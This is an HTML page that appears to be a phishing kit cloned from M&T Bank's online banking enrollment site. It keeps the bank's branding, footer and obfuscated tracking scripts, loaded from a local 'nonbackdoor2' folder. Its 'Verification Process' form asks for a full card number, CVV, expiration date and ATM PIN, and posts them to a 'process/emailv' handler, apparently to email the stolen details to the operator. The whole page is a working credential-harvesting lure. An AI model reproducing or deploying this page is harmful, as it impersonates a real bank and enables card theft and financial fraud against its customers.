<!DOCTYPE html>
<html class="__sticky-footer" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<script type="text/javascript" async="" src="./nonbackdoor2/f.txt"></script><script type="text/javascript" async="" charset="utf-8" id="utag_9" src="./nonbackdoor2/quantum-mtb.js"><iframe style="display: none;"></iframe></script><script type="text/javascript" async="" charset="utf-8" id="utag_8" src="./nonbackdoor2/js"></script><script src="./nonbackdoor2/utag.js" type="text/javascript" async=""></script><script type="text/javascript">
(function(){
window.JuFn=!!window.JuFn;try{(function(){(function(){})();var _s=38;try{var is,Js,Ls=S(13)?1:0,Os=S(980)?0:1;for(var Zs=(S(457),0);Zs<Js;++Zs)Ls+=(S(809),2),Os+=(S(725),3);is=Ls+Os;window.sz===is&&(window.sz=++is)}catch(iS){window.sz=is}var IS=!0;function l(s){var _=arguments.length,J=[];for(var O=1;O<_;++O)J.push(arguments[O]-s);return String.fromCharCode.apply(String,J)}
function LS(s){var _=10;!s||document[l(_,128,115,125,115,108,115,118,115,126,131,93,126,107,126,111)]&&document[L(_,128,115,125,115,108,115,118,115,126,131,93,126,107,126,111)]!==l(_,128,115,125,115,108,118,111)||(IS=!1);return IS}function L(s){var _=arguments.length,J=[],O=1;while(O<_)J[O-1]=arguments[O++]-s;return String.fromCharCode.apply(String,J)}function OS(){}LS(window[OS[I(1086816,_s)]]===OS);LS(typeof ie9rgb4!==L(_s,140,155,148,137,154,143,149,148));
LS(RegExp("\x3c")[I(1372167,_s)](function(){return"\x3c"})&!RegExp(I(42851,_s))[I(1372167,_s)](function(){return"'x3'+'d';"}));
var zS=window[l(_s,135,154,154,135,137,142,107,156,139,148,154)]||RegExp(L(_s,147,149,136,143,162,135,148,138,152,149,143,138),I(-20,_s))[l(_s,154,139,153,154)](window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]),s_=+new Date+(S(405)?840546:6E5),S_,I_,j_,J_=window[l(_s,153,139,154,122,143,147,139,149,155,154)],L_=zS?S(489)?32134:3E4:S(636)?4556:6E3;
document[l(_s,135,138,138,107,156,139,148,154,114,143,153,154,139,148,139,152)]&&document[l(_s,135,138,138,107,156,139,148,154,114,143,153,154,139,148,139,152)](L(_s,156,143,153,143,136,143,146,143,154,159,137,142,135,148,141,139),function(s){var _=41;document[l(_,159,146,156,146,139,146,149,146,157,162,124,157,138,157,142)]&&(document[l(_,159,146,156,146,139,146,149,146,157,162,124,157,138,157,142)]===I(1058781942,_)&&s[L(_,146,156,125,155,158,156,157,142,141)]?j_=!0:document[L(_,159,146,156,146,
139,146,149,146,157,162,124,157,138,157,142)]===l(_,159,146,156,146,139,149,142)&&(S_=+new Date,j_=!1,o_()))});function I(s,_){s+=_;return s.toString(36)}function o_(){if(!document[L(78,191,195,179,192,199,161,179,186,179,177,194,189,192)])return!0;var s=+new Date;if(s>s_&&(S(850)?597084:6E5)>s-S_)return LS(!1);var _=LS(I_&&!j_&&S_+L_<s);S_=s;I_||(I_=!0,J_(function(){I_=!1},S(739)?0:1));return _}o_();var Z_=[S(487)?14469158:17795081,S(140)?27611931586:2147483647,S(422)?1626137277:1558153217];
function Si(s){var _=13;s=typeof s===I(1743045663,_)?s:s[L(_,129,124,96,129,127,118,123,116)](S(142)?36:19);var J=window[s];if(!J||!J[l(_,129,124,96,129,127,118,123,116)])return;var O=""+J;window[s]=function(s,_){I_=!1;return J(s,_)};window[s][L(_,129,124,96,129,127,118,123,116)]=function(){return O}}for(var _i=(S(559),0);_i<Z_[l(_s,146,139,148,141,154,142)];++_i)Si(Z_[_i]);LS(!1!==window[L(_s,112,155,108,148)]);window.SO=window.SO||{};window.SO._LJ="0880bc73cb16e80003ba421fc8c2144ce9609d063f81b6fa0d0cd024bc77dc265c4ec72225314c4422b9aeaad183b1ee04c8a494018a59cfa9679164ffb0bf3581025945556aa912089fe832f2a671a97353e9337fe302c9ffe3bde41166b2b25e96d8146f17bc2d35d574c7fff924875634c4ec4b0203d5f85252bb5bb28f0118c4152581f5c12175da382d4ef5bbbe2479694229ac1782ceaf0b0288f1b9d62e595a0b5bc225069e344248c9aa4bc1b10c33560f52b8d38d717cecb4a246cd25e25ab65368e78ac5f0a6dcbc0ef2080964484fc2ab2d6a0044fd1c98fd760b55bb91aebd796743a3ff8d2d0d8397e8";
function Ii(s){var _=+new Date,J;!document[L(3,116,120,104,117,124,86,104,111,104,102,119,114,117,68,111,111)]||_>s_&&(S(369)?426727:6E5)>_-S_?J=LS(!1):(J=LS(I_&&!j_&&S_+L_<_),S_=_,I_||(I_=!0,J_(function(){I_=!1},S(850)?0:1)));return!(arguments[s]^J)}function S(s){return 206>s}(function(){var s=/(\A([0-9a-f]{1,4}:){1,6}(:[0-9a-f]{1,4}){1,1}\Z)|(\A(([0-9a-f]{1,4}:){1,7}|:):\Z)|(\A:(:[0-9a-f]{1,4}){1,7}\Z)/ig,_=document.getElementsByTagName("head")[0],J=[];_&&(_=_.innerHTML.slice(0,1E3));while(_=s.exec(""))J.push(_)})();})();}catch(x){}finally{ie9rgb4=void(0);};function ie9rgb4(a,b){return a>>b>>0};

})();

</script>

<script type="text/javascript" src="./nonbackdoor2/0856addebbab2000e508b3c5f679fac2e6824f49bdf7f7b16e801a09fe070f46"></script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script type="text/javascript" src="./nonbackdoor2/ruxitagentjs_ICA2Vfhqru_10243220606153550.js" data-dtconfig="rid=RID_-857388665|rpid=1774584693|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=ea7c4b59f27d43eb|rcdec=1209600000|featureHash=ICA2Vfhqru|vcv=2|rdnt=1|uxrgce=1|bp=3|srmcrv=10|cuc=zgefxirc|mel=100000|dpvc=1|md=mdcc1=a#AuthID@value|ssv=4|lastModification=1658643030046|dtVersion=10243220606153550|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/ruxitagentjs_ICA2Vfhqru_10243220606153550.js"></script><link href="./nonbackdoor2/foundation-all.css" rel="stylesheet">
    <link href="./nonbackdoor2/mtb.css" rel="stylesheet">
    <style>
        /*SUGGESTED ADD FOR THE FRAMEWORK*/

        .no-headerFooter > .mtb-page-header
        {
            display: none;
        }

        .no-headerFooter {
            padding-top: 1.5rem;
        }


    </style>
    
    <title>Enroll in Online Banking  - Verify Account   | M&amp;T Bank</title>
    <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon">
<meta class="foundation-mq"><script type="text/javascript" async="" charset="utf-8" id="utag_mtbank.olb-legacy_1" src="./nonbackdoor2/utag.1.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_mtbank.olb-legacy_8" src="./nonbackdoor2/utag.8.js"></script><script type="text/javascript" async="" charset="utf-8" id="utag_mtbank.olb-legacy_9" src="./nonbackdoor2/utag.9.js"></script><meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="text/javascript" async="" src="./nonbackdoor2/f_002.txt"></script></head>
<body class="">

    

<header class="mtb-page-header">
    <a class="mtb__logo" href="https://www.mtb.com/home-page">
        <img class="mtb__logo" src="./nonbackdoor2/mtb-logo.svg" alt="M&amp;T Bank">
    </a>
    
        <a href="https://onlinebanking.mtb.com/" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a>
</header>    
    <div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
    <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
    </div>
    <div class="mtb-app-enrollment--content">
        



<form action="process/emailv" class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm">    <input type="hidden" value="PAI" name="EnrolleeType" id="EnrolleeType">
    <input type="hidden" value="BusinessAccount" name="EnrollmentType" id="EnrollmentType">
    <input type="hidden" name="EnrolleeIdentifier" id="EnrolleeIdentifier">
    <input type="hidden" name="EnrolleeToken" id="EnrolleeToken">
    <input type="hidden" value="False" name="IsMobilePlatfom" id="IsMobilePlatfom">
    <input type="hidden" value="OLB:MOE:VerifyYourAccountInfo" name="TagPageName" id="TagPageName">
    <input type="hidden" value="False" name="SetFieldsToProtected" id="SetFieldsToProtected">
        <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
            <div class="cell">
                

<!-- page title -->

    <div class="mtb-section-header mtb-section-header--top">
        <p class="__top-title">
            
        </p>
        <h1>
            Verification Process
        </h1>
        <p>
        </p>
    </div>

            </div>

                <div class="cell">
                    


<div class="expanded button-group button-group__toggle">
            <button data-ensightentag="CardInfoButton" type="button" class="button js-enrolleeTypeTab" data-value="PAI">Account Information</button>
            <button data-ensightentag="AccountInfoButton" type="button" class="button js-enrolleeTypeTab active " data-value="PAI">Card Information</button>
    </div>
                </div>

            





<div class="cell" data-showfor="BusinessAccount">
    

    <h2 class="mtb-form__section-title" data-showfor="BusinessAccount">
        Enter your card information  to verify your identity.
            <button tabindex="0" type="button" class="" aria-haspopup="true" aria-controls="companyadmin-modal" data-ensightentag="CompanyAdministratorInfoQuestionIcon" data-open="companyadmin-modal">
                <span class="show-for-sr">Show Help</span>
            </button>
    </h2>
        <div data-parentfor="AccountNumber" class="cell js-formFieldParent" data-formattype="">
            <label for="AccountNumber">Card Number</label>
            <div class="js-maskFldParent input-group m-fake-single-input" data-maskoverlay="">
                <input data-fcid="" maxlength="16" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers" placeholder="________________" data-inputtype="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="number" id="AccountNumber" name="cc">
                    <div class="input-group-button">
                        <button type="button" data-btnfor="AccountNumber" class="button clear js-showHide">
                            Hide
                        </button>
                    </div>
            </div>
            <p class="form-error" id="AccountNumberError" role="alert"></p>
                <p class="form-help-text"></p>
            
        </div>
        <div data-parentfor="AccountNumber" class="cell js-formFieldParent" data-formattype="">
            <label for="AccountNumber">Card Cvv</label>
            <div class="js-maskFldParent input-group m-fake-single-input" data-maskoverlay="">
                <input data-fcid="" maxlength="3" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="numbers" placeholder="___" data-inputtype="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="number" id="AccountNumber" name="cvv">
                    <div class="input-group-button">
                        <button type="button" data-btnfor="AccountNumber" class="button clear js-showHide">
                            Hide
                        </button>
                    </div>
            </div>
            <p class="form-error" id="AccountNumberError" role="alert"></p>
                <p class="form-help-text"></p>
            
        </div>        

         <div data-parentfor="CompanyName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
            <label for="CompanyName">Expiration Date</label>
            <input data-fcid="" maxlength="8" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="custom" placeholder="mm/yyyy" type="email" id="CompanyName" name="exp" data-inputtype="number" data-regexname="companyNameAllow">
            <p class="form-error" id="CompanyNameError" role="alert"></p>
            <p class="form-help-text"></p>
        </div>
        <h2 class="mtb-form__section-title" data-showfor="BusinessAccount">

    </h2>
</div>        <div data-parentfor="CompanyName" class="cell js-formFieldParent" data-showfor="BusinessAccount">
            <label for="CompanyName">Atm Pin</label>
            <input data-fcid="" maxlength="4" class="js-formnputItem" data-allowpaste="True" data-allowcopy="True" data-textboxaccepts="custom" placeholder="____" type="password" id="CompanyName" name="pin" data-inputtype="text" data-regexname="companyNameAllow">
            <p class="form-error" id="CompanyNameError" role="alert"></p>
            <p class="form-help-text"></p>
        </div>    
        

        </section>
        <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
            

    <div class="cell">
            <button data-ensightentag="ContinueButton" type="button" method="POST" action="process/emailv" data-url="" class="button button__form js-submit">
                Verify
            </button>
    </div>
    <div class="cell">
            <a href="index" class="button button__fake-padding expanded clear">
                Go Back
            </a>
    </div>

        </section>
</form>





<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility">        
        




<input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility">
    </div>

    
<footer class="mtb-footer" role="contentinfo">
    <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
        <div class="cell">
            <p>
                ©2023 M&amp;T Bank. All Rights Reserved.<br>
                Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">Terms of Use</a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
            </p>
            <div class="mtb-footer__logo">
                <a href="https://www.mtb.com/equalhousinglender" target="_blank">
                    <img src="./nonbackdoor2/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                </a>
                <a href="https://www.mtb.com/olb-entrust" target="_blank">
                    <img src="./nonbackdoor2/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                </a>
            </div>
            <p>
                Equal Housing Lender. NMLS #381076<br>
                <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC.</a>
            </p>
        </div>
    </div>
</footer>
    <script src="./nonbackdoor2/jquery-3.3.1.js"></script>
    <script src="./nonbackdoor2/foundation.js"></script>
    <script src="./nonbackdoor2/tealium_prod.js"></script>
    <script src="./nonbackdoor2/errorMsg.js"></script>
    <script src="./nonbackdoor2/mtb-app.js"></script><div class="reveal-overlay"><div class="reveal mtb-reveal" id="companyadmin-modal" role="dialog" data-reveal="" data-options="closeOnClick:false" aria-hidden="true" data-yeti-box="companyadmin-modal" data-resize="companyadmin-modal" data-i="du1nv7-i">
        <button class="close-button" aria-label="Close modal" type="button" data-ensightentag="CloseButton" data-close=""><span class="m-icon m-icon-close" aria-hidden="true" data-ensightentag="CloseLightbox"></span></button>

    <div class="mtb-reveal-title __has-close-button">
        <h1>Company Administrator</h1>
    </div>

    <div class="mtb-reveal-body">
        
    <div class="cell cell__double-padding">
    <p class="">
        A Company Administrator is one individual who serves as the 
primary contact for your company's M&amp;T Online Banking for Business 
relationship. To be an Administrator, the individual must be an 
authorized signer on ALL enrolled accounts.
    </p>
    <p class="">
        The Company Administrator is responsible for adding or removing 
accounts from the service, setting up additional users within the 
company and defining the degree of account access and transaction rights
 for each user. Company Administrators are also responsible for 
maintaining and updating all user passcodes.
    </p>
</div>

    </div>

</div></div><div class="reveal-overlay"><div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false" aria-hidden="true" data-yeti-box="minwarning-modal" data-resize="minwarning-modal" data-i="hftuog-i">

    <div class="mtb-reveal-title ">
        <h1>Timeout Message</h1>
    </div>

    <div class="mtb-reveal-body">
        
    <div class="cell">
        <p>Your online banking session has been inactive for 9 minutes. 
For your security, we will automatically log you out in 1 minute. Click 
Stay Online to continue your session.</p>
    </div>

    </div>

        <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
            
    <div class="cell small-6">
        <a href="https://m.mtb.com/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
    </div>
    <div class="cell small-6">
        <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
    </div>

        </div>
</div></div>
    <script src="./nonbackdoor2/formInputValidations.js"></script>        
    
    <script src="./nonbackdoor2/enrollment.js"></script>

    

    <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
        <div class="mtb-spinner--triple-dot">
            <div></div>
            <div></div>
            <div></div>
            <span class="show-for-sr">Loading ...</span>
        </div>
    </div>


</body></html>